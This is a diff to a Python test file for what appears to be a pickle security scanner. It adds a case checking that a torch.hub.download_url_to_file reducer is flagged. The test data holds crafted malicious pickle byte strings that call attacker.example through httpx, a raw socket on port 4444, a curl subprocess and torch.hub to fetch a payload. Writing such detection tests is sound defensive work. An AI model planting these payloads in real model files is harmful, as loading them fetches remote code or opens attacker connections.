@@ -3084,6 +3084,10 @@ def test_scan_bytes_allows_inert_url_literals_with_executable_terms(literal: str
         (b"chttpx\nget\n(Vhttps://attacker.example/payload\ntR.", "httpx.get"),
         (b"csocket\ncreate_connection\n(Vattacker.example\nI4444\ntR.", "socket.create_connection"),
         (b"csubprocess\nrun\n((Vcurl\nVhttps://attacker.example/payload\netR.", "subprocess.run"),
+        (
+            b"ctorch.hub\ndownload_url_to_file\n(Vhttps://attacker.example/payload\nV/tmp/model.bin\ntR.",
+            "torch.hub.download_url_to_file",
+        ),
     ],
 )
 def test_scan_bytes_keeps_network_url_reducers_actionable(payload: bytes, import_reference: str) -> None:
